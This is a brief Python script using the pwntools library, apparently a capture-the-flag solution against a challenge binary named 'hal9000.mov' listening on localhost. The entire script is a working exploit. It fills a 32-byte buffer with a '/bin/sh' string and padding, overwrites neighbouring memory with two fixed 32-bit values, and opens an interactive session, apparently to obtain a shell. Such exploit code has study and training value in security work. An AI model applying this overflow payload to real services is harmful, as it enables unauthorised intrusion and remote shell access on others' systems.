from pwn import *
import time, sys

exe = ELF('./hal9000.mov')
context.binary = exe

buf_size = 32

#p = process('./hal9000.mov')
p = remote('localhost', 25005)

p.recvuntil(b':')

payload = b'/bin/sh\x00'

p.sendline(payload + b'A' * (buf_size - len(payload)) + p32(0x6e313233) + p32(0x61646d69))
p.recvuntil(b'GOODBYTE\n', timeout=5)

p.interactive()
